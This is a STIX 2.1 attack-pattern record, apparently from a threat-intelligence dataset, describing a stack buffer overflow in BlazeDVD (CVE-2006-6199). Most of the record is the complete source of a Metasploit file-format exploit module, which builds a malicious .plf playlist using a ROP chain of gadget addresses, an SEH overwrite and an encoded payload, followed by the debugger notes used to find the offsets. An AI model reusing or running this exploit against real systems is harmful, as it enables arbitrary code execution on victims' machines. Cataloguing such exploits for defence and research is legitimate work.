{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26f7a0f7-0730-43a0-b837-4b2a7e1f07a5",
    "created": "2024-08-14T16:37:55.860272Z",
    "modified": "2024-08-14T16:37:55.860276Z",
    "name": "BlazeDVD 6.1 PLF Buffer Overflow",
    "description": " This module exploits a stack over flow in BlazeDVD 5.1 and 6.2. When the application is used to open a specially crafted plf file a buffer is overwritten allowing for the execution of arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/blazedvd_plf.rb",
            "external_id": "blazedvd_plf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6199"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BlazeDVD 6.1 PLF Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack over flow in BlazeDVD 5.1 and 6.2. When\n          the application is used to open a specially crafted plf file,\n          a buffer is overwritten allowing for the execution of arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n         [\n           'MC', # Developed target 5.1\n           'Deepak Rathore', # ExploitDB PoC\n           'Spencer McIntyre', # Developed taget 6.2\n           'Ken Smith' # Developed target 6.2\n         ],\n      'References'     =>\n        [\n          [ 'CVE' , '2006-6199' ],\n          [ 'EDB', '32737' ],\n          [ 'OSVDB', '30770' ],\n          [ 'BID', '35918' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x1a\",\n          'DisableNops'  =>  true\n        },\n\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'BlazeDVD 6.2',\n            {\n              'Payload' =>\n                {\n                  # Stackpivot => add esp,0xfffff254\n                  'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n                }\n            }\n          ],\n          [ 'BlazeDVD 5.1',\n            {\n              'Ret' => 0x100101e7,\n              'Payload' =>\n                {\n                  'EncoderType' => Msf::Encoder::Type::AlphanumUpper\n                }\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-08-03',\n      'DefaultTarget'  => 0,\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SERVICE_DOWN, ],\n          'SideEffects' => [ SCREEN_EFFECTS, ],\n        },\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']),\n      ])\n  end\n\n  def rop_chain\n    # rop chain generated with mona.py - www.corelan.be\n    case target.name\n    when 'BlazeDVD 6.2'\n      rop_gadgets = [ ]\n      # 0x6162e802 RETN (ROP NOP) [EPG.dll]\n      rop_gadgets.fill(0x6162e802, 0..7)\n      rop_gadgets += [\n        0x61636758, # POP EAX # RETN [EPG.dll]\n        0x10011108, # ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]\n        0x616306ed, # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll]\n        0x616385d8, # XCHG EAX,ESI # RETN 0x00 [EPG.dll]\n        0x61628ea2, # POP EBP # RETN [EPG.dll]\n        0x616069a1, # push esp # ret 0x04 [EPG.dll]\n        0x61626702, # POP EAX # RETN [EPG.dll]\n        0xfffffdff, # Value to negate, will become 0x00000201\n        0x61627d9c, # NEG EAX # RETN [EPG.dll]\n        0x61640124, # XCHG EAX,EBX # RETN [EPG.dll]\n        0x61629938, # POP EAX # RETN [EPG.dll]\n        0xffffffc0, # Value to negate, will become 0x00000040\n        0x61627d9c, # NEG EAX # RETN [EPG.dll]\n        0x61608ba2, # XCHG EAX,EDX # RETN [EPG.dll]\n        0x61612f5a, # POP ECX # RETN [EPG.dll]\n        0x100142ab, # &Writable location [SkinScrollBar.Dll]\n        0x616313ac, # POP EDI # RETN [EPG.dll]\n        0x6162e588, # RETN (ROP NOP) [EPG.dll]\n        0x6162d638, # POP EAX # RETN [EPG.dll]\n        0x90909090, # nop\n        0x61620831, # PUSHAD # RETN [EPG.dll]\n      ]\n    end\n    return rop_gadgets.flatten.pack(\"V*\")\n  end\n\n  def exploit\n    case target.name\n    when 'BlazeDVD 5.1'\n      plf = rand_text_alpha_upper(6024)\n      plf[868,8] = Rex::Arch::X86.jmp_short(6) + rand_text_alpha_upper(2)  + [target.ret].pack('V')\n      plf[876,12] = make_nops(12)\n      plf[888,payload.encoded.length] = payload.encoded\n    when 'BlazeDVD 6.2'\n      plf = rand_text_alphanumeric(260)\n      plf << rop_chain\n      plf << payload.encoded\n    end\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(plf)\n  end\nend\n\n=begin\n0:000> !exchain\n0012f2c8: 31644230\nInvalid exception stack at 64423963\n0:000> !pattern_offset 6024 0x31644230\n[Byakugan] Control of 0x31644230 at offset 872.\n0:000> !pattern_offset 6024 0x64423963\n[Byakugan] Control of 0x64423963 at offset 868.\n0:000> s -b 0x10000000 0x10018000 5e 59 c3\n100012cd  5e 59 c3 56 8b 74 24 08-57 8b f9 56 e8 a2 3c 00  ^Y.V.t$.W..V..<.\n100101e7  5e 59 c3 90 90 90 90 90-90 8b 44 24 08 8b 4c 24  ^Y........D$..L$\n0:000> u 0x100012cd L3\nskinscrollbar!SkinSB_ParentWndProc+0x1fd:\n100012cd 5e              pop     esi\n100012ce 59              pop     ecx\n100012cf c3              ret\n=end\n",
    "x_mitre_disclosure_date": "2009-08-03",
    "x_mitre_platforms": [
        "win'"
    ]
}